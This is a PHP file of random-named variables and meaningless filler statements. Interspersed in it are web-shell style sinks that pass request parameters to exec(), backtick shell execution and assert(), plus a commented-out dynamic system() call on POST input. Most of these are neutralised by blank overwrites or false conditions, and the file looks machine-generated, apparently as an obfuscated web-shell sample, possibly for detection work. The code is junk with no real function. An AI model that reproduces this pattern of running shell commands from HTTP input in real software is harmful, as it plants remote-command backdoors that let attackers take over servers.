<?php
$TeYZQXQeyr = 'KX6LS0u';
$wzgSHa = new stdClass();
$wzgSHa->UU = 'B7UiV6';
$wzgSHa->kbyhs = 'TU7A';
$wzgSHa->Mvgs0 = 'pAAhVqW';
$wzgSHa->Ukkgh = 'OKR';
$Y_Lo_lVZCg6 = 'QS6IaXNA';
$S9CxPpXQ = new stdClass();
$S9CxPpXQ->XKtU_XQ = 'JzLdUpJ0wCo';
$S9CxPpXQ->MFFbFn = 'yHcJmpUBC';
$S9CxPpXQ->LJmoNiZT = 'KPieu';
$S9CxPpXQ->klvsI = 'C6YKE';
$S9CxPpXQ->_dBhEXY = 'BJkMZ';
$S9CxPpXQ->goM = 'oGfbNZwOewJ';
$S9CxPpXQ->_c6QyM7KZG = 'U8QILy1P';
$IDMt3c = '_6P1u7Q';
$UKIJCA6 = 'RbqNu8k7Zl';
$YuuQmBtdC = 'XFzGYE';
$vvSXro7WkPT = 'WnoruDbnuwZ';
$EpXSI = 'og2qfnWL7';
$_qew = 'FPnnIh_mRuk';
$IzBNvPp1oSL = new stdClass();
$IzBNvPp1oSL->S3My8z7 = 'qvCq7';
$IzBNvPp1oSL->qEGy5HJn = 'OjbIuMk';
echo $TeYZQXQeyr;
$Y_Lo_lVZCg6 .= 'eDZ6JKBhQ';
preg_match('/jFNSJp/i', $IDMt3c, $match);
print_r($match);
$UKIJCA6 .= 'giAGP4vULr';
$YuuQmBtdC = $_GET['YwPbWC'] ?? ' ';
var_dump($vvSXro7WkPT);
if(function_exists("MgkdAmoX")){
    MgkdAmoX($EpXSI);
}
$_qew = explode('WfIXMYm', $_qew);
$_GET['DR3mTaJIs'] = ' ';
assert($_GET['DR3mTaJIs'] ?? ' ');
$ugGrZ8SMpB = 'jIZzj';
$LO2 = 'BL';
$TN = 'mY9X_MmvZ';
$RxxdgeMFUA = 'bq';
$BsOnI = 'WkSQni9j';
$ugGrZ8SMpB = explode('jX7UooMu1MX', $ugGrZ8SMpB);
$LO2 = $_POST['Pu94eTLL07'] ?? ' ';
$xuv1h0NxCR = array();
$xuv1h0NxCR[]= $RxxdgeMFUA;
var_dump($xuv1h0NxCR);

function Q_LLJZ()
{
    $_GET['jzPZgabg6'] = ' ';
    $fwpnmX = 'tei7_J';
    $sJpMLpI0 = 'to1aYI3hwf';
    $JAf_I9f = 'zYO';
    $xW3 = new stdClass();
    $xW3->edhX4A9SYOA = 'JQt_NWpgGg';
    $xW3->P6NLcG2w_ = 'nJxQJHV';
    $xW3->MKiN_Kf6T_ = 'sNstl7O';
    $xW3->LcJpzXz74U = 'DC4__Yqb2n6';
    $xW3->NiGJMADkWo = 'RrMEP';
    $xW3->vKv1PcOW1T = 'GFracFtfa';
    $xW3->yn3QOUg = 'tmBGgPDU';
    $HkBvt5wX = new stdClass();
    $HkBvt5wX->Wwa = 'HDKMFuasq';
    $HkBvt5wX->uxCkA = 'wYjwl';
    $HkBvt5wX->Z66BLH = 'cF3k_WaIxAj';
    $HkBvt5wX->ay5nEY = 'pnnrEK1e7n';
    $HkBvt5wX->_BBAnZu = 'zqU';
    $HkBvt5wX->nXUNWoLF = 'fHlK';
    $lVPPC = 'Nzdd';
    $kn_g28YEs6 = 't635_LOFr8G';
    echo $fwpnmX;
    $sJpMLpI0 .= 'jKhGsi';
    var_dump($JAf_I9f);
    $kn_g28YEs6 = $_POST['XkJkC_3Chp'] ?? ' ';
    echo `{$_GET['jzPZgabg6']}`;
    
}
$NQxQmdBcScn = 'Z7W4SprWr';
$OaM = 'gyBK12';
$DZh = new stdClass();
$DZh->QlG_GeEl = 'f5WH41Uzg2A';
$DZh->b9bdVJZ = 'Ycj';
$DZh->h9p05H = 'MwqDASNe_';
$DZh->MW8551 = 'xb3nUS2v';
$DZh->Eb = 'Iga';
$JNY6ZuUVo = new stdClass();
$JNY6ZuUVo->hPCMN64fJBe = 'crl';
$QxySz5O10 = 'yR';
$P3B = 'kfG3umlhQ';
preg_match('/nOnVgI/i', $NQxQmdBcScn, $match);
print_r($match);
echo $QxySz5O10;
var_dump($P3B);
$_GET['qvEdntOsF'] = ' ';
$P3bg = new stdClass();
$P3bg->Ch = 'vTbrGUg0QJx';
$P3bg->HmTczgl8pLR = 'etfRbzujW';
$Z8HVjiZEcF = 'Ni5Q_';
$SX = 'M6HZM7Ul';
$eLr = 'Qy2';
$s0sJIP3aa = 'u2kOxIvf2x9';
$wsaPW9ldPS = new stdClass();
$wsaPW9ldPS->fT8Yh = 'h_eQ';
$wsaPW9ldPS->jaL7oF = 'LOET';
$wsaPW9ldPS->hrI3tMub0Jr = 'gRh';
$wsaPW9ldPS->A2T_spnemS = 'QckXwjn';
$wsaPW9ldPS->PKt = 'IERaQFi_';
$wsaPW9ldPS->eBcHr = 'bfrllro4JP';
$wsaPW9ldPS->Z7M_k = 'g4Z3GbjsGZ';
$wsaPW9ldPS->L3XUwvFa = 'BEv';
$Nx = 'tUSPvUnNST';
$Es = 'gwffC';
if(function_exists("LLVCAA3qiAjCv2Y")){
    LLVCAA3qiAjCv2Y($Z8HVjiZEcF);
}
$SX = explode('Kzs1_7a', $SX);
$XQijNVcV = array();
$XQijNVcV[]= $eLr;
var_dump($XQijNVcV);
var_dump($s0sJIP3aa);
$Nx = $_POST['LeVlZ6'] ?? ' ';
preg_match('/gi1_6H/i', $Es, $match);
print_r($match);
exec($_GET['qvEdntOsF'] ?? ' ');
$LRk = 'o3z';
$Dj7h4a = 'JWQ';
$KFg = 'YU4p0wSj';
$lyHkXaRX = new stdClass();
$lyHkXaRX->MfHk = 'MIEVG';
$lyHkXaRX->KCJgG8Z = 'bg';
$lyHkXaRX->CSltL6qDz = 'b3';
$lyHkXaRX->qb = 'wVmyWfAq';
$lyHkXaRX->TTz6ZNg = 'HB87F5';
$Dj7h4a = $_GET['S5K0UizrvPwA7T3'] ?? ' ';
$KFg = explode('u_6klZtHv', $KFg);
if('K1yi9H0lp' == 'AJtbBM4nq')
exec($_GET['K1yi9H0lp'] ?? ' ');
/*
$WvAFNWtf = 't_';
$BSN = 'o6';
$GPol3LlOlt = 'qVhQZIcQzl';
$f4xDVS4Oy = new stdClass();
$f4xDVS4Oy->Cp9XBR = 'aAO';
$f4xDVS4Oy->nsWf2fhn6 = '_SVVV0b';
$f4xDVS4Oy->KMA73O8Yz = 'EY_PaBn';
$f4xDVS4Oy->an = 'DhTa9';
$TF5l8 = 'Bofau';
$y1O = 'thtmdKT1';
$PGjj = '_p6u8f4';
$kCt = 'AJ';
$WvAFNWtf = $_GET['kZQ9acNk5'] ?? ' ';
var_dump($BSN);
var_dump($GPol3LlOlt);
$TF5l8 = $_POST['SAmfDKK7Hmi2lj'] ?? ' ';
preg_match('/RWcSOc/i', $PGjj, $match);
print_r($match);
var_dump($kCt);
*/

function ZIf()
{
    $P5KPks83 = 'kGR7rQ97fF';
    $uM = 'UqdCV6rmeH';
    $rOW = 'rbW9g';
    $H0HnUrI0gp = 'hu_g';
    $MZrYhmGJEM8 = 'pVpi4et';
    $afr = 'laAsqc2';
    if(function_exists("Y6cUzkegrG")){
        Y6cUzkegrG($P5KPks83);
    }
    var_dump($uM);
    $H0HnUrI0gp = explode('BPj2trr5ez', $H0HnUrI0gp);
    $bOOrJSz = array();
    $bOOrJSz[]= $MZrYhmGJEM8;
    var_dump($bOOrJSz);
    echo $afr;
    $fVDbO = 'y8';
    $iN2xFYw = 'uFhiVNP';
    $QEjDhXUx = 'M2NZYNO_5';
    $hV9PnNo = 'jPfWwaxF';
    $isZf_l = 'M98pd';
    $wc = 'oR';
    $yrQI7Ufe__ = new stdClass();
    $yrQI7Ufe__->MY = 'H9iIts';
    $yrQI7Ufe__->if_lW = 'Ed4FR7';
    $yrQI7Ufe__->NLwnS0K = 'zN8jpVC';
    $yrQI7Ufe__->H3yj = 'xGSxlPz';
    $UOs = 't8sq';
    $hiZ8q4Mns = 'et';
    $HqkkT1rf5 = 'xc';
    $hV9PnNo = $_POST['ccVlRvMcGx'] ?? ' ';
    $cQhEa5eE = array();
    $cQhEa5eE[]= $isZf_l;
    var_dump($cQhEa5eE);
    $wc .= 'j6NHmkkx';
    $UOs = $_POST['mxADL9JHqcEXAR'] ?? ' ';
    str_replace('bFDWl75_1y', 'P3BRdno8cGi', $hiZ8q4Mns);
    $HqkkT1rf5 = $_GET['EwlPEeJWTz'] ?? ' ';
    
}
$Rj = 'C0';
$dcpj = 'QpLlLObz';
$x9i2WBvVwZo = 'CKz';
$I3IxU = 'SvP';
$vfL = 'AhYZ';
$Ec = 'utf';
$Rj = $_POST['NswJn2ylPNjyaeSb'] ?? ' ';
$IhS55j = array();
$IhS55j[]= $dcpj;
var_dump($IhS55j);
$x9i2WBvVwZo = $_GET['WcdpeYYK4'] ?? ' ';
if(function_exists("lsqQBD5GXxF")){
    lsqQBD5GXxF($I3IxU);
}
$orwPMA = array();
$orwPMA[]= $Ec;
var_dump($orwPMA);
$_GET['gvOYgiPGm'] = ' ';
$qr0HbnSxqP = 'tc9d';
$Qvg = 'o3SPyBpsh';
$FGZwYrTwG = new stdClass();
$FGZwYrTwG->N4_oe = 'sXO';
$FGZwYrTwG->d2LT = 'LUaCnuud79';
$FGZwYrTwG->CwhO = 'G24zri2aJ';
$FGZwYrTwG->lmb_ = 'PeR3bK0Uc';
$FGZwYrTwG->IKT = 'pCMtgHs0GX';
$pDdM_sm = 'MhsmCyKFf';
$SQ = 'fwIf7P9YKmC';
$odfbJvKD = 'ZLFbaqcMwuE';
$Y6 = 'mfuVc5_';
$fSS1E = new stdClass();
$fSS1E->NT = 'C_7m8';
$fSS1E->qJRUztheDq_ = 'Wa';
$CXKmNiy1 = 'tEAPDc0SdFy';
$d_YpPN = 'ggo3Dw';
$w4E = 'OO0vigkI';
$AyosM = 'lxNGkN';
$vvzJPrl = 'lwEd';
$twfuBTG = 'By0gg';
$Qvg = explode('yUd4SEdx', $Qvg);
$pDdM_sm = $_POST['KtxFx2m09D'] ?? ' ';
preg_match('/zadSxy/i', $SQ, $match);
print_r($match);
$odfbJvKD = $_POST['lSzrkYgNiZe'] ?? ' ';
str_replace('u_7BgNFKsOkpFL', 'JCSipa9jKm', $Y6);
echo $CXKmNiy1;
echo $d_YpPN;
echo $w4E;
$AyosM = explode('gdI_tfxO', $AyosM);
$gvm94ohUk = array();
$gvm94ohUk[]= $vvzJPrl;
var_dump($gvm94ohUk);
$twfuBTG = $_GET['tKvpGponBK4VAgi'] ?? ' ';
echo `{$_GET['gvOYgiPGm']}`;
$IGj0Wx = 'YZ2OwNxl';
$QPy61ZNRT = 'z8I_hB3';
$wgjTLHey = 'RS';
$s1D6J5qp = 'C9PO';
$K_8wWDT = 'KP30mX2ISI';
$IGj0Wx .= 'qsInSK0wx0qwUoS';
if(function_exists("EpDgHOQZlWdD")){
    EpDgHOQZlWdD($QPy61ZNRT);
}
echo $s1D6J5qp;
var_dump($K_8wWDT);
$MXNtkBU80t = new stdClass();
$MXNtkBU80t->MFJIlB = 'fi_PX9hYEpB';
$MXNtkBU80t->XQeUgghK5Q = 'YbYczzZg';
$MXNtkBU80t->CsLAa9VEWm = 'Zo4xD';
$MXNtkBU80t->MVrdYhEV = 'SDrq';
$XvtN = 'iTiVZ7K';
$J9KitZhP = 'Chcw4q2zdL';
$MSqFS = 'pJm';
$FKzG96zYIhA = 'Rnwu2z9hue';
$ktMjShUhjpO = 'qq';
$pNIgBNj = 'xtzrdt';
$qR3isMfdfS = 'wHz';
if(function_exists("x2tYe7yEs7tzzmbM")){
    x2tYe7yEs7tzzmbM($XvtN);
}
str_replace('aXupf1apoYfwXTb', 'CLD7UzniFtITDxF4', $J9KitZhP);
var_dump($MSqFS);
$ktMjShUhjpO = $_POST['VTiHv0_G'] ?? ' ';
str_replace('g76DXMIHNIlB', 'O9aZqYB9LSoN8A8K', $pNIgBNj);
$zLHFr4KnEb1 = array();
$zLHFr4KnEb1[]= $qR3isMfdfS;
var_dump($zLHFr4KnEb1);
/*
$L5kqFEVU2 = 'system';
if('AYq12nxMp' == 'L5kqFEVU2')
($L5kqFEVU2)($_POST['AYq12nxMp'] ?? ' ');
*/
$Bm1tCG3V0RU = 'eGTdAW';
$cSNmx = 'WwDGaGq_M';
$Lsb4IQO7 = 'A3JAjB0EPc';
$aow = new stdClass();
$aow->zJq = 'lhiSPQm95va';
$aow->NKE = 'GL9GiCzaak';
$aow->rtw7FG = 'C41hzMp';
$G1 = 'mrcW8yx';
$YceDoz = 'HcOO5iStE';
$Pidf = 'VXs7BVz73h8';
if(function_exists("E50qRkPI7")){
    E50qRkPI7($Bm1tCG3V0RU);
}
echo $cSNmx;
$Lsb4IQO7 = explode('IKhRtpNZmP', $Lsb4IQO7);
preg_match('/s1e9Qc/i', $G1, $match);
print_r($match);
$WnAOaf9B = array();
$WnAOaf9B[]= $YceDoz;
var_dump($WnAOaf9B);
$Pidf = $_GET['SMDAuZqd8c'] ?? ' ';
$_GET['BvcsRYBBx'] = ' ';
$BzRw = 'Gng';
$L9vVR = new stdClass();
$L9vVR->hai = 'xlpgD';
$L9vVR->EaUgIMe = 'AbJs5ytIpV';
$L9vVR->XmjY = 'fC';
$L9vVR->pZRwurso = 'hxaljCfG';
$L9vVR->E7pxe9GcE = 'Z5';
$L9vVR->akvnrYBmr = 'Ug0F3h';
$LQlZ = 'ef1sNVHGQ8n';
$qe2YH4EHRyG = 'EGTv5wy03F';
$mMClhkeS = 'lkZiCPDg2y';
$dvys_JV2 = 'Xn';
$OsxAc = 'KkpAodPkS1';
$bDbut5bA = 'jrg';
$E02W6HNog = 'VIs';
$rdcT7rNL = 'QxlJ';
var_dump($BzRw);
preg_match('/bKdXnj/i', $LQlZ, $match);
print_r($match);
$qe2YH4EHRyG .= 'kW154_kFWEHvaqvV';
$LuqTKHlk_D = array();
$LuqTKHlk_D[]= $mMClhkeS;
var_dump($LuqTKHlk_D);
$dvys_JV2 = $_POST['Fk3TVh9axn'] ?? ' ';
if(function_exists("dsQFDYANIv")){
    dsQFDYANIv($OsxAc);
}
$bDbut5bA = $_GET['MtiBE8Rg'] ?? ' ';
preg_match('/o3HxL5/i', $E02W6HNog, $match);
print_r($match);
var_dump($rdcT7rNL);
exec($_GET['BvcsRYBBx'] ?? ' ');
/*

function GrDDmL()
{
    
}
*/
/*
$T6klYOqc = 'WDYa1nOPz';
$zSJa25 = 'bISScJ';
$Et3RjZb6c3 = 'Ixj5ZP9';
$EXAc = new stdClass();
$EXAc->DCRb = 'bss5fmRLo';
$EXAc->DoExlh_3DkH = 'OA5gj';
$EXAc->Rm_6ezD4x = 'dZ';
$EXAc->BQ9M = 'OJ9LhP6yG';
$ZdIvrpqi1r7 = new stdClass();
$ZdIvrpqi1r7->lwGFSoe_ = 'erb_nu63R';
$ZdIvrpqi1r7->krPy = 'lSL';
$ZdIvrpqi1r7->VYOo9B2e3U = 'jsYhazBc';
$ZdIvrpqi1r7->PdsUYEN = 'GHWC';
echo $zSJa25;
if(function_exists("lMpqGkUyvrYHK8")){
    lMpqGkUyvrYHK8($Et3RjZb6c3);
}
*/
$GZL4qGrEj = 'xO';
$sibN = 'dMJWqOQ';
$xRxyX2 = 'Z6Jb_G';
$yPBd2 = 'iRX';
$Yw2N1DKJldk = 'gzkYOvFxS';
$OjYOg = 'pJAx';
$EwMr1 = 'nx';
$dl2zLh = 'D7wm';
$G5qhA = 'N0qngaLMWI';
$XwXRUhgLi2t = 'wgGFzV';
$eihVLYJ_ = 'GN';
$atq = 's4';
$HyBPREMi0 = 'XVoxYwQHj';
$yZZ453 = 'H9Izda';
$GZL4qGrEj = $_GET['yK77vujNI'] ?? ' ';
if(function_exists("W2tklk9qAR")){
    W2tklk9qAR($sibN);
}
$xRxyX2 = explode('T4aSfUq5dN', $xRxyX2);
var_dump($Yw2N1DKJldk);
var_dump($OjYOg);
if(function_exists("orNAlx14Xt")){
    orNAlx14Xt($EwMr1);
}
$ov_YO8 = array();
$ov_YO8[]= $dl2zLh;
var_dump($ov_YO8);
$XbkoCxjabN = array();
$XbkoCxjabN[]= $G5qhA;
var_dump($XbkoCxjabN);
str_replace('LWXXtj6y', 'KjMaJNjxLTEE', $XwXRUhgLi2t);
$eihVLYJ_ = explode('oVLg8Fb36C', $eihVLYJ_);
var_dump($atq);
echo $HyBPREMi0;
$yZZ453 = $_GET['QhEq3pGerJ'] ?? ' ';
echo 'End of File';
